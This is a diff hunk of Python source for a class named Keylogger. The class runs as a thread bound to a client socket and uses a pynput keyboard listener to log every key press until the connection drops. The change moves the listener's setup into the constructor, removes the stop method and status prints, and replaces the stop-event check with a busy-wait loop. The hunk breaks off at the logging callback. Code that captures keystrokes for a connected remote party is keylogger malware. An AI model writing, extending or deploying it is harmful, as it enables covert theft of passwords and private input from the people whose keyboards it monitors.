@@ -5,30 +5,20 @@ class Keylogger(threading.Thread):
     def __init__(self, client_socket):
         super().__init__()
         self.client_socket = client_socket
-        self._stop_event = threading.Event()
-        self.listener = None
+        self.listener = keyboard.Listener(on_press=self.log)
 
     def run(self):
-        self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
-        print("Server: keylogger started")
 
-        while not self._stop_event.is_set():
+        while True:
             # Check if the client is still connected
             if not self.client_socket.fileno() == -1:
                 continue
 
-            # Stop the listener when the client disconnects
+            # stop listener and wait for thread to finish
             self.listener.stop()
+            self.listener.join()
             break
-
-        print("Server: keylogger stopped")
-
-    def stop(self):
-        self._stop_event.set()
-        if self.listener:
-            self.listener.stop()
-            self.listener.join()  # Wait for the listener to finish
 
     def log(self, key):
         try:
